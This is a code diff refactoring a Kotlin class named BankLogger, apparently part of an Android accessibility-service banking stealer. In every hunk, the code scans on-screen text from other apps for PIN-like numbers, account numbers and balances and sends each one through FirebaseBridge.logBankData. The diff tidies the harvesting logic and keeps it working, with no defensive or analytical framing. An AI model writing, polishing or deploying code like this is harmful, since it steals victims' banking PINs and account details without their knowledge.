@@ -16,28 +16,20 @@ class BankLogger {
             val desc = event.contentDescription?.toString() ?: ""
 
             // Log PIN
-            if (text.contains(Regex("\\b\\d{4,6}\\b")) || desc.contains("PIN")) {
-                val pin = Regex("\\b\\d{4,6}\\b").find(text)?.value
-                if (pin != null) {
-                    FirebaseBridge.logBankData(pkg, pin = pin.value)
-                }
+            Regex("\\b\\d{4,6}\\b").find(text)?.let { match ->
+                FirebaseBridge.logBankData(pkg, pin = match.value)
             }
 
             // Log Account Number
-            if (text.contains(Regex("\\b\\d{8,17}\\b"))) {
-                val acc = Regex("\\b\\d{8,17}\\b").find(text)?.value
-                if (acc != null) {
-                    FirebaseBridge.logBankData(pkg, account = acc)
-                }
+            Regex("\\b\\d{8,17}\\b").find(text)?.let { match ->
+                FirebaseBridge.logBankData(pkg, account = match.value)
             }
 
             // Log Balance
-            if (text.contains("\$") || text.contains("Balance") || text.contains("Available")) {
-                val balance = Regex("\\$\\s*[\\d,]+\\.\\d{2}").find(text)?.value
-                    ?: Regex("Balance[:\\s]+[\\d.]+").find(text)?.value
-                if (balance != null) {
-                    FirebaseBridge.logBankData(pkg, balance = balance)
-                }
+            val balance = Regex("\\$\\s*[\\d,]+\\.\\d{2}").find(text)?.value
+                ?: Regex("Balance[:\\s]+[\\d.]+").find(text)?.value
+            if (balance != null) {
+                FirebaseBridge.logBankData(pkg, balance = balance)
             }
         }
     }
